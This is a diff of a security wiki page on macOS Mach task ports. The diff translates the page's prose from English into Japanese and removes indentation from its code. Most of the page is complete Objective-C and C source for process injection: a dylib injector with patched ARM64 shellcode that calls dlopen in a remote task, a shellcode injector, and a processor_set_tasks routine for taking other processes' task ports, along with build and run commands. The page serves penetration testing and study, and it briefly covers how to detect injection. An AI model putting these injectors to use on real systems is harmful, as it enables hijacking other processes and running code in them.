-    NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
-    NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
-    return r.location == NSNotFound;
+NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
 }
 
 int main(int argc, const char * argv[]) {
-    @autoreleasepool {
-        if (argc < 2) {
-            NSLog(@"Usage: %s <pid or process name>", argv[0]);
-            return 1;
-        }
+@autoreleasepool {
+if (argc < 2) {
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
+return 1;
+}
 
-        NSString *arg = [NSString stringWithUTF8String:argv[1]];
-        pid_t pid;
+NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;
 
-        if (isStringNumeric(arg)) {
-            pid = [arg intValue];
-        } else {
-            pid = pidForProcessName(arg);
-            if (pid == 0) {
-                NSLog(@"Error: Process named '%@' not found.", arg);
-                return 1;
-            }
-            else{
-                printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
-            }
-        }
+if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}
 
-        inject(pid);
-    }
+inject(pid);
+}
 
-    return 0;
+return 0;
 }
 ```
-
 </details>
-
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ./inject <pi or string>
 ```
-
 > [!TIP]
-> For this to work on iOS you need the entitlement `dynamic-codesigning` in order to be able to make a writable memory executable.
+> これがiOSで機能するためには、書き込み可能なメモリ実行可能ファイルを作成するために`dynamic-codesigning`の権限が必要です。
 
-### Dylib Injection in thread via Task port
+### タスクポート経由のスレッドでのDylibインジェクション
 
-In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previous injection, was generated using Mach api, so **it's not posix compliant**.
+macOSでは、**スレッド**は**Mach**を介して、または**posix `pthread` api**を使用して操作できます。前回のインジェクションで生成したスレッドはMach apiを使用して生成されたため、**posix準拠ではありません**。
 
-It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.
+**posix**準拠のapiを使用する必要がなかったため、**コマンドを実行するためのシンプルなシェルコードを注入することが可能でした**。しかし、**より複雑なインジェクション**では、**スレッド**も**posix準拠である必要があります**。
 
-Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.
+したがって、**スレッドを改善するためには**、**`pthread_create_from_mach_thread`**を呼び出す必要があります。これにより、**有効なpthreadが作成されます**。その後、この新しいpthreadは**dlopenを呼び出して**システムから**dylibをロード**することができるため、異なるアクションを実行するために新しいシェルコードを書く代わりに、カスタムライブラリをロードすることが可能です。
 
-You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):
+**例のdylibs**は以下にあります（例えば、ログを生成し、その後リッスンできるもの）：
 
 {{#ref}}
 ../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
@@ -821,7 +787,6 @@ You can find **example dylibs** in (for example the one that generates a log and
 <details>
 
 <summary>dylib_injector.m</summary>
-
 ```objectivec
 // gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 // Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
@@ -847,18 +812,18 @@ You can find **example dylibs** in (for example the one that generates a log and
 // And I say, bullshit.
 kern_return_t mach_vm_allocate
 (
-        vm_map_t target,
-        mach_vm_address_t *address,
-        mach_vm_size_t size,
-        int flags
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
 );
 
 kern_return_t mach_vm_write
 (
-        vm_map_t target_task,
-        mach_vm_address_t address,
-        vm_offset_t data,
-        mach_msg_type_number_t dataCnt
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
 );
 
 
@@ -873,282 +838,278 @@ kern_return_t mach_vm_write
 
 char injectedCode[] =
 
-    // "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
-    // Call pthread_set_self
+// Call pthread_set_self
 
-    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
-    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
-    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
-    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
-    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
-    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
-    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
-    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
-    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
-    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
-    "\x00\x00\x00\x14" // loop: b loop              ; loop forever
+"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
+"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
+"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
+"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
+"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
+"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
+"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
+"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
+"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
+"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
+"\x00\x00\x00\x14" // loop: b loop              ; loop forever
 
-    // Call dlopen with the path to the library
-    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
-    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
-    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
-    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
-    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
+// Call dlopen with the path to the library
+"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
+"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
+"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
+"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
+"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
 
-    // Call pthread_exit
-    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
-    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
-    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
+// Call pthread_exit
+"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
+"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
+"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
 
-    "PTHRDCRT"  // <-
-    "PTHRDEXT"  // <-
-    "DLOPEN__"  // <-
-    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
+"PTHRDCRT"  // <-
+"PTHRDEXT"  // <-
+"DLOPEN__"  // <-
+"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
 
 
 
 
 int inject(pid_t pid, const char *lib) {
 
-    task_t remoteTask;
-    struct stat buf;
+task_t remoteTask;
+struct stat buf;
 
-    // Check if the library exists
-    int rc = stat (lib, &buf);
+// Check if the library exists
+int rc = stat (lib, &buf);
 
-    if (rc != 0)
-    {
-        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
-        //return (-9);
-    }
+if (rc != 0)
+{
+fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
+//return (-9);
+}
 
-    // Get access to the task port of the process we want to inject into
-    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
-    if (kr != KERN_SUCCESS) {
-        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
-        return (-1);
-    }
-    else{
-        printf("Gathered privileges over the task port of process: %d\n", pid);
-    }
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
 
-    // Allocate memory for the stack
-    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
-    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-    else
-    {
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
 
-        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
-    }
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
 
-    // Allocate memory for the code
-    remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-
-
-    // Patch shellcode
-
-    int i = 0;
-    char *possiblePatchLocation = (injectedCode );
-    for (i = 0 ; i < 0x100; i++)
-    {
-
-        // Patching is crude, but works.
-        //
-        extern void *_pthread_set_self;
-        possiblePatchLocation++;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
 
 
-        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
-        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
-        uint64_t addrOfDlopen = (uint64_t) dlopen;
+// Patch shellcode
 
-        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
-        {
-            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
-            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
-        }
+int i = 0;
+char *possiblePatchLocation = (injectedCode );
+for (i = 0 ; i < 0x100; i++)
+{
 
-        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
-        {
-            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
-            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
-        }
-
-        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
-        {
-            printf ("DLOpen @%llx\n", addrOfDlopen);
-            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
-        }
-
-        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
-        {
-            strcpy(possiblePatchLocation, lib );
-        }
-    }
-
-	// Write the shellcode to the allocated memory
-    kr = mach_vm_write(remoteTask,                   // Task port
-	                   remoteCode64,                 // Virtual Address (Destination)
-	                   (vm_address_t) injectedCode,  // Source
-	                    0xa9);                       // Length of the source
+// Patching is crude, but works.
+//
+extern void *_pthread_set_self;
+possiblePatchLocation++;
 
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
-        return (-3);
-    }
+uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
+uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
+uint64_t addrOfDlopen = (uint64_t) dlopen;
+
+if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
+printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
+}
+
+if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
+printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+}
+
+if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+{
+printf ("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+}
+
+if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+{
+strcpy(possiblePatchLocation, lib );
+}
+}
+
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
 
 
-    // Set the permissions on the allocated code memory
-    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
-
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
-        return (-4);
-    }
-
-    // Set the permissions on the allocated stack memory
-    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
-
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
-        return (-4);
-    }
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
 
 
-    // Create thread to run shellcode
-    struct arm_unified_thread_state remoteThreadState64;
-    thread_act_t         remoteThread;
+// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
-    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
-        //remoteStack64 -= 8;  // need alignment of 16
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
-    const char* p = (const char*) remoteCode64;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
-    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
-    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
-    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
 
-    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
-        return (-3);
-    }
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
 
-    return (0);
+const char* p = (const char*) remoteCode64;
+
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
 }
 
 
 
 int main(int argc, const char * argv[])
 {
-    if (argc < 3)
-	{
-		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
-		fprintf (stderr, "   _action_: path to a dylib on disk\n");
-		exit(0);
-	}
+if (argc < 3)
+{
+fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
+fprintf (stderr, "   _action_: path to a dylib on disk\n");
+exit(0);
+}
 
-    pid_t pid = atoi(argv[1]);
-    const char *action = argv[2];
-    struct stat buf;
+pid_t pid = atoi(argv[1]);
+const char *action = argv[2];
+struct stat buf;
 
-    int rc = stat (action, &buf);
-    if (rc == 0) inject(pid,action);
-    else
-    {
-        fprintf(stderr,"Dylib not found\n");
-    }
+int rc = stat (action, &buf);
+if (rc == 0) inject(pid,action);
+else
+{
+fprintf(stderr,"Dylib not found\n");
+}
 
 }
 ```
-
 </details>
-
 ```bash
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
+### スレッドハイジャックによるタスクポート <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
 
-### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
-
-In this technique a thread of the process is hijacked:
+この技術では、プロセスのスレッドがハイジャックされます：
 
 {{#ref}}
 macos-thread-injection-via-task-port.md
 {{#endref}}
 
-### Task Port Injection Detection
+### タスクポートインジェクション検出
 
-When calling `task_for_pid` or `thread_create_*` increments a counter in the struct task from the kernel which can by accessed from user mode calling task_info(task, TASK_EXTMOD_INFO, ...)
+`task_for_pid` または `thread_create_*` を呼び出すと、カーネルの構造体タスク内のカウンターがインクリメントされ、ユーザーモードから `task_info(task, TASK_EXTMOD_INFO, ...)` を呼び出すことでアクセスできます。
 
-## Exception Ports
+## 例外ポート
 
-When a exception occurs in a thread, this exception is sent to the designated exception port of the thread. If the thread doesn't handle it, then it's sent to the task exception ports. If the task doesn't handle it, then it's sent to the host port which is managed by launchd (where it'll be acknowledge). This is called exception triage.
+スレッドで例外が発生すると、この例外はスレッドの指定された例外ポートに送信されます。スレッドがそれを処理しない場合、タスクの例外ポートに送信されます。タスクがそれを処理しない場合、ホストポートに送信され、launchdによって管理されます（ここで承認されます）。これを例外トリアージと呼びます。
 
-Note that at the end usually if not properly handle the report will end up being handle by the ReportCrash daemon. However, it's possible for another thread in the same task to manage the exception, this is what crash reporting tools like `PLCreashReporter` does.
+通常、適切に処理されない場合、レポートはReportCrashデーモンによって処理されます。ただし、同じタスク内の別のスレッドが例外を管理することも可能であり、これが `PLCreashReporter` のようなクラッシュレポートツールが行うことです。
 
-## Other Objects
+## その他のオブジェクト
 
-### Clock
+### クロック
 
-Any user can access information about the clock however in order to set the time or modify other settings one has to be root.
+任意のユーザーはクロックに関する情報にアクセスできますが、時間を設定したり他の設定を変更したりするにはroot権限が必要です。
 
-In order to get info its possible to call functions from the `clock` subsystem like: `clock_get_time`, `clock_get_attributtes` or `clock_alarm`\
-In order to modify values the `clock_priv` subsystem can be sued with functions like `clock_set_time` and `clock_set_attributes`
+情報を取得するためには、`clock` サブシステムの関数を呼び出すことができます： `clock_get_time`、`clock_get_attributtes` または `clock_alarm`\
+値を変更するためには、`clock_priv` サブシステムを使用し、`clock_set_time` や `clock_set_attributes` のような関数を使用できます。
 
-### Processors and Processor Set
+### プロセッサとプロセッサセット
 
-The processor apis allows to control a single logical processor calling functions like `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...
+プロセッサAPIは、`processor_start`、`processor_exit`、`processor_info`、`processor_get_assignment` などの関数を呼び出すことで、単一の論理プロセッサを制御することを可能にします。
 
-Moreover, the **processor set** apis provides a way to group multiple processors into a group. It's possible to retrieve the default processor set calling **`processor_set_default`**.\
-These are some interesting APIs to interact with the processor set:
+さらに、**プロセッサセット** APIは、複数のプロセッサをグループ化する方法を提供します。**`processor_set_default`** を呼び出すことで、デフォルトのプロセッサセットを取得できます。\
+プロセッサセットと対話するための興味深いAPIは以下の通りです：
 
 - `processor_set_statistics`
-- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
-- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
+- `processor_set_tasks`: プロセッサセット内のすべてのタスクへの送信権の配列を返します
+- `processor_set_threads`: プロセッサセット内のすべてのスレッドへの送信権の配列を返します
 - `processor_set_stack_usage`
 - `processor_set_info`
 
-As mentioned in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), in the past this allowed to bypass the previously mentioned protection to get task ports in other processes to control them by calling **`processor_set_tasks`** and getting a host port on every process.\
-Nowadays you need root to use that function and this is protected so you will only be able to get these ports on unprotected processes.
+[**この投稿**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)で述べたように、過去には、**`processor_set_tasks`** を呼び出して他のプロセスのタスクポートを取得し、それらを制御するために、前述の保護を回避することができました。\
+現在では、その関数を使用するにはroot権限が必要であり、これは保護されているため、保護されていないプロセスでのみこれらのポートを取得できます。
 
-You can try it with:
+以下のように試すことができます：
 
 <details>
 
-<summary><strong>processor_set_tasks code</strong></summary>
-
+<summary><strong>processor_set_tasks コード</strong></summary>
 ````c
 // Maincpart fo the code from https://newosxbook.com/articles/PST2.html
 //gcc ./port_pid.c -o port_pid
@@ -1181,71 +1142,72 @@ You can try it with:
 mach_port_t task_for_pid_workaround(int Pid)
 {
 
-  host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
-  mach_port_t   psDefault;
-  mach_port_t   psDefault_control;
+host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
+mach_port_t   psDefault;
+mach_port_t   psDefault_control;
 
-  task_array_t  tasks;
-  mach_msg_type_number_t numTasks;
-  int i;
+task_array_t  tasks;
+mach_msg_type_number_t numTasks;
+int i;
 
-   thread_array_t       threads;
-   thread_info_data_t   tInfo;
+thread_array_t       threads;
+thread_info_data_t   tInfo;
 
-  kern_return_t kr;
+kern_return_t kr;
 
-  kr = processor_set_default(myhost, &psDefault);
+kr = processor_set_default(myhost, &psDefault);
 
-  kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
- if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
-         mach_error("host_processor_set_priv",kr); exit(1);}
+kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
+if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
+mach_error("host_processor_set_priv",kr); exit(1);}
 
-  printf("So far so good\n");
+printf("So far so good\n");
 
-  kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
-  if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }
+kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
+if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }
 
-  for (i = 0; i < numTasks; i++)
-        {
-                int pid;
-                pid_for_task(tasks[i], &pid);
-                printf("TASK %d PID :%d\n", i,pid);
-				char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
-				if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
-					printf("Command line: %s\n", pathbuf);
-				} else {
-					printf("proc_pidpath failed: %s\n", strerror(errno));
-				}
-            if (pid == Pid){
-                printf("Found\n");
-                return (tasks[i]);
-            }
-        }
+for (i = 0; i < numTasks; i++)
+{
+int pid;
+pid_for_task(tasks[i], &pid);
+printf("TASK %d PID :%d\n", i,pid);
+char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
+if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
+printf("Command line: %s\n", pathbuf);
+} else {
+printf("proc_pidpath failed: %s\n", strerror(errno));
+}
+if (pid == Pid){
+printf("Found\n");
+return (tasks[i]);
+}
+}
 
-   return (MACH_PORT_NULL);
+return (MACH_PORT_NULL);
 } // end workaround
 
 
 
 int main(int argc, char *argv[]) {
-    /*if (argc != 2) {
-        fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
-        return 1;
-    }
+/*if (argc != 2) {
+fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
+return 1;
+}
 
-    pid_t pid = atoi(argv[1]);
-    if (pid <= 0) {
-        fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
-        return 1;
-    }*/
+pid_t pid = atoi(argv[1]);
+if (pid <= 0) {
+fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
+return 1;
+}*/
 
-    int pid = 1;
+int pid = 1;
 
-    task_for_pid_workaround(pid);
-    return 0;
+task_for_pid_workaround(pid);
+return 0;
 }
 
 ```
+
 ````
 
 </details>
